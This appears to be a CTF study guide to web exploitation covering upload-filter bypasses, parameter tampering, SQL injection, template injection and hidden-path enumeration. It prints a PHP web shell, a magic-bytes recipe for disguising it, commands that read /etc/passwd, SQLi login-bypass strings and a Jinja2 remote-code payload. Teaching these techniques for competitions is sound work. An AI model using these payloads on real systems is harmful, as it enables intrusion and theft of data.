## Introduction

Web exploitation is the most common category in beginner-to-intermediate CTF competitions. This guide consolidates the key techniques, mental models, and tools needed to systematically approach web challenges. Whether you are facing an authentication bypass, file upload filter, or template injection — the same analytical framework applies.

---

## General Reconnaissance Approach

Before attempting any exploit, gather information:

- **View page source** (`Ctrl + U`) — inspect HTML, JavaScript, CSS, and comments
- **Open Developer Tools** (`F12`) — examine headers, cookies, JavaScript logic, API calls
- **Try default credentials** — `admin:admin`, `admin:password`, `guest:guest`
- **Check linked files** — inspect all `.js`, `.css` files for hardcoded secrets
- **Monitor network requests** — watch the Network tab for hidden API endpoints

## File Upload Attacks

When a challenge has a file upload feature:

### Extension Bypass Techniques

```
shell.php        → Basic PHP web shell
shell.php.jpg    → Double extension (extension confusion)
shell.jpg.php    → Reversed double extension
shell.pHp        → Case variation bypass
shell.php5       → Alternative PHP extension
```

### Magic Bytes Bypass

Upload filters that check file content (not just extension) look at the first bytes — the **magic bytes**:

| File Type | Magic Bytes (hex) |
|---|---|
| JPEG | `FF D8 FF` |
| PNG | `89 50 4E 47` |
| GIF | `47 49 46 38` |
| PDF | `25 50 44 46` |

To bypass, prepend valid magic bytes to a PHP payload:

```bash
echo -ne "ÿØÿ" > shell.jpg.php
echo '<?php system($_GET["cmd"]); ?>' >> shell.jpg.php
```

### PHP Web Shell Usage

```php
<?php system($_GET["cmd"]); ?>  # Basic RCE shell
```

Access it at:

```
http://target.com/uploads/shell.php?cmd=ls
http://target.com/uploads/shell.php?cmd=cat%20/etc/passwd
```

### MIME Type Bypass with Burp Suite

1. Intercept the upload request in Burp Suite
2. Locate the `Content-Type: application/php` header in the multipart form data
3. Change it to `Content-Type: image/jpeg`
4. Forward the modified request

## Parameter Tampering

Modify URL query parameters to test for insecure access control:

```
?admin=true
?debug=1
?id=1  →  ?id=2,?id=100 (IDOR testing)
?file=../../../../etc/passwd  (Path traversal)
?view=source
```

Edit hidden form fields via Developer Tools:
1. Right-click a form field → Inspect Element
2. Modify `type="hidden"` values or input constraints
3. Submit the modified form

## SQL Injection Basics

When a login form shows the SQL query or returns database errors:

### Authentication Bypass

```sql
-- Classic comment bypass:
Username: admin'--
Password: anything

-- Results in query:
SELECT * FROM users WHERE name='admin'--' AND password='...';
-- Password check is commented out → instant login
```

### Other Classic Payloads

```sql
' OR '1'='1          # Always true condition
' OR 1=1--           # Always true with comment
admin'/*             # Block comment bypass
' UNION SELECT null,null--  # Union injection probe
```

## SSTI (Server-Side Template Injection) Quick Reference

When a page reflects your input, test for SSTI:

```jinja2
{% raw %}{{7*7}}{% endraw %}          # Result 49 → Jinja2 confirmed
{% raw %}${7*7}{% endraw %}            # Result 49 → FreeMarker/Thymeleaf confirmed
{% raw %}#{7*7}{% endraw %}            # Result 49 → Pebble/Spring confirmed
```

Basic RCE payload (Jinja2/Flask):

```jinja2
{% raw %}{{config.__class__.__init__.__globals__['os'].popen('id').read()}}{% endraw %}
```

## Hidden Files and Directories

Always check these standard paths:

```
/robots.txt          # Crawler exclusion rules — often leaks paths
/sitemap.xml         # Site structure overview
/.git/               # Source code exposure
/admin/              # Admin panels
/backup.zip          # Backup archives
/.env                # Environment variables (credentials!)
/secret/             # Common hidden directory name
```

**Automated Directory Brute-Forcing:**

```bash
# ffuf
ffuf -u http://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt

# gobuster
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
```

## CTF Web Exploitation Checklist

| Check | Tool |
|---|---|
| View HTML source and comments | `Ctrl+U` |
| Inspect JavaScript files | Browser DevTools Sources |
| Try default login credentials | Manual |
| Tamper cookies and session data | DevTools Application tab |
| Modify URL parameters | Browser address bar |
| Check robots.txt and hidden paths | Browser |
| Try file upload bypass | Curl / Burp Suite |
| Test for SQL injection | Manual / sqlmap |
| Test for SSTI | Manual input |
| Decode Base64 / JWT / URL encoding | Browser console / CyberChef |

## Key Tools

| Tool | Purpose |
|---|---|
| Burp Suite | Intercept, modify, replay HTTP requests |
| curl | Command-line HTTP client with full header control |
| ffuf / gobuster | Directory and file brute-forcing |
| sqlmap | Automated SQL injection testing |
| CyberChef | Multi-format encoding/decoding |
| jwt.io | JWT token inspector |

## Conclusion

Web exploitation in CTFs follows a systematic pattern: enumerate, inspect, identify the vulnerability type, then apply the known technique. The checklist above covers the most common challenge patterns. With practice, recognizing the signature behaviors of each vulnerability becomes second nature.
